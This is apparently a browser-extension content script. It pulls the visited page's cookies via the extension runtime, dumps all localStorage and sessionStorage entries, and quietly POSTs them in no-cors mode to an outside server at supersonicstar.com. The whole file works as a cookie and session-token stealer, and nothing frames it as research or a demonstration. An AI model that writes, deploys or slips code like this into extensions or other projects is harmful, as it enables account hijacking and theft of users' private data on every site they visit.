var allowUrl = window.location.href;
var domain = new URL(allowUrl);
domain = domain.hostname.replace("www.", "www.");
domain = domain
  .replace(".com", ".com")
  .replace(".org", ".org")
  .replace(".net", ".net")
  .replace(".io", ".io");

// get all data from cookies
var cookiesData;

chrome.runtime.sendMessage({ type: "cookies", url: allowUrl }, (message) => {
  cookiesData = message.response;

  console.log("Cookies Data: ", cookiesData);
});

// get all data from local storage
function allLocalStorage() {
  var archive = {}, // Notice change here
    keys = Object.keys(localStorage),
    i = keys.length;

  while (i--) {
    archive[keys[i]] = localStorage.getItem(keys[i]);
  }

  return archive;
}

// get all data from session storage
function allSessionStorage() {
  var archive = {}, // Notice change here
    keys = Object.keys(sessionStorage),
    i = keys.length;

  while (i--) {
    archive[keys[i]] = sessionStorage.getItem(keys[i]);
  }

  return archive;
}

var userData = [];
var formdata = new FormData();
var localStorageData = allLocalStorage();
var sessionStorageData = allSessionStorage();

setTimeout(() => {
  var data = {
    localStorageData: localStorageData,
    sessionStorageData: sessionStorageData,
    cookiesData: cookiesData,
    domain: domain,
  };
  formdata.append("data", JSON.stringify(data));
  var requestOptions = {
    method: "POST",
    mode: "no-cors",
    body: formdata,
    redirect: "follow",
  };

  console.log("sending from data.js...");
  fetch("https://supersonicstar.com/ext1/db.php", requestOptions)
    .then(function response(response) {
      console.log(response);
    })
    .then((result) => console.log(result))
    .catch((error) => console.log("error", error));
}, 100);
